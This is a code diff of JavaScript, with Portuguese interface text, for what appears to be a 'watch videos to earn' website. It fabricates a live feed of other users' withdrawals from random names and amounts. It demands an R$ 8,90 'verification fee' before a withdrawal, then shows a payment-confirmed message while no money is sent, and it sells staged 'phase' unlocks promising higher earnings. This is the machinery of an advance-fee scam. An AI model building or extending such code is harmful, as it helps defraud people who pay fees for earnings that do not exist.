+    // ✅ Pede taxa de R$ 8,90 como restrição no saque
+    document.getElementById("bloco-taxa").classList.remove("oculto");
+    aviso("Confirme a taxa de verificação de R$ 8,90 para liberar o saque.", "sucesso");
+}
+
+function confirmarTaxa() {
+    const cod = document.getElementById("codigo-taxa").value.trim();
+    if (cod === gerarCodigoTaxa(banco.telefone)) {
+        banco.taxaPaga = true;
+        const valSaque = parseFloat(document.getElementById("valor-pedido").value || 0);
+        banco.saldo -= valSaque;
+        atualizarSaldo();
+        salvar();
+        document.getElementById("bloco-taxa").innerHTML = '<div class="aviso verde">✅ Pagamento confirmado! Seu saque de ' + dinheiro(valSaque) + ' foi solicitado e será enviado em breve.</div>';
+    } else {
+        aviso("Código incorreto.", "erro");
+    }
+}
+
+function saqueAleat() {
+    const nome = CONFIG.nomes[Math.floor(Math.random() * CONFIG.nomes.length)];
+    const valor = (Math.random() * 40 + 15).toFixed(2);
+    const tempo = Math.floor(Math.random() * 12) + 1 + " min";
+    return { nome: nome, valor: valor, tempo: tempo };
+}
+
+function montarSaques() {
+    let html = "";
+    for (let i = 0; i < ultimosSaques.length; i++) {
+        html += '<div class="transacao">' +
+            '<div><div class="transacao-nome">' + ultimosSaques[i].nome + '</div>' +
+            '<div class="transacao-hora">' + ultimosSaques[i].tempo + ' atrás</div></div>' +
+            '<div class="transacao-valor">+R$ ' + ultimosSaques[i].valor.replace(".", ",") + '</div>' +
+        '</div>';
+    }
+    document.getElementById("lista-transacoes").innerHTML = html;
+}
+
+function iniciarSaques() {
+    for (let i = 0; i < 5; i++) ultimosSaques.push(saqueAleat());
+    montarSaques();
+    setInterval(function(){
+        ultimosSaques.unshift(saqueAleat());
+        ultimosSaques.pop();
+        montarSaques();
+    }, 8000);
+}
+
+function carregarPerfil() {
+    document.getElementById("perfil-inicial").textContent = banco.nome[0];
+    document.getElementById("perfil-nome-completo").textContent = banco.nome;
+    document.getElementById("p-nome").textContent = banco.nome;
+    document.getElementById("p-telefone").textContent = banco.telefone;
+    document.getElementById("p-videos").textContent = banco.videosAssistidos;
+    document.getElementById("p-saldo").textContent = dinheiro(banco.saldo);
+    document.getElementById("p-fase").textContent = banco.fase;
+    if (!banco.liberadoFase2 && banco.liberacaoVisivel) {
+        document.getElementById("codigo-perfil-box").classList.remove("oculto");
+    }
+    aviso("Dados atualizados.", "sucesso");
+}
+
+function mostrarAba(nome) {
+    document.getElementById("aba-inicio").classList.add("oculto");
+    document.getElementById("aba-libera").classList.add("oculto");
+    document.getElementById("aba-saque").classList.add("oculto");
+    document.getElementById("aba-extrato").classList.add("oculto");
+    document.getElementById("aba-perfil").classList.add("oculto");
+    const botoes = document.querySelectorAll(".menu-btn");
+    for (let i = 0; i < botoes.length; i++) botoes[i].classList.remove("ativo");
+
+    if (nome === "inicio") {
+        document.getElementById("aba-inicio").classList.remove("oculto");
+        botoes[0].classList.add("ativo");
+        montarTarefas();
+    } else if (nome === "libera") {
+        if (!banco.liberacaoVisivel && !banco.liberadoFase2) {
+            return aviso("Assista mais vídeos para desbloquear.", "erro");
+        }
+        document.getElementById("aba-libera").classList.remove("oculto");
+        botoes[1].classList.add("ativo");
+    } else if (nome === "saque") {
+        document.getElementById("aba-saque").classList.remove("oculto");
+        botoes[2].classList.add("ativo");
+    } else if (nome === "extrato") {
+        document.getElementById("aba-extrato").classList.remove("oculto");
+        botoes[3].classList.add("ativo");
+    } else if (nome === "perfil") {
+        document.getElementById("aba-perfil").classList.remove("oculto");
+        botoes[4].classList.add("ativo");
+        carregarPerfil();
+    }
+}
+
+window.onload = function() {
+    if (carregar()) {
+        document.getElementById("tela-cadastro").classList.add("oculto");
+        document.getElementById("plataforma").classList.remove("oculto");
+        document.getElementById("nome-usuario").textContent = banco.nome;
+        atualizarSaldo();
+        
+        if (banco.liberacaoVisivel || banco.liberadoFase2) {
+            document.getElementById("btn-libera").disabled = false;
+        }
+        if (banco.liberadoFase2) {
+            document.getElementById("fase-tag").textContent = "Fase 2 — Valores aumentados";
+            document.getElementById("caixa-pagamento-libera").classList.add("oculto");
+            document.getElementById("aviso-libera").innerHTML = "<strong>✅ Pagamento confirmado!</strong><br>Já pode sacar ou continuar assistindo!";
+            document.getElementById("et2").classList.add("ativo");
+        }
+        if (banco.fase3Desbloqueada) {
+            document.getElementById("fase-tag").textContent = "Fase 3 — Valores elevados";
+            document.getElementById("et3").classList.add("ativo");
+        }
+        if (banco.fase4Desbloqueada) {
+            document.getElementById("fase-tag").textContent = "Fase 4 — Valores máximos";
+            document.getElementById("et4").classList.add("ativo");
+        }
+        montarTarefas();
+        iniciarSaques();
+    }
+};
 </script>
 
 </body>
